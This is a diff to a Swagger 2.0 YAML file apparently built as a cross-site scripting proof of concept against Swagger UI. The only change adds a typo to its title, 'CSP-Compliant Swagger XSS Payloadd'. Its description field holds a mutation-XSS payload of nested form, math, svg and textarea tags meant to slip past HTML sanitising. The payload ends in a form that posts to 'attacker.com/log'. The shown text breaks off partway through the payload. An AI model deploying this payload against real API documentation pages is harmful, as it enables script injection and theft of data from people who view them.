@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: CSP-Compliant Swagger XSS Payload
+  title: CSP-Compliant Swagger XSS Payloadd
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea>
     </svg></mtext></mglyph></textarea><form action="https://attacker.com/log" id="xss">
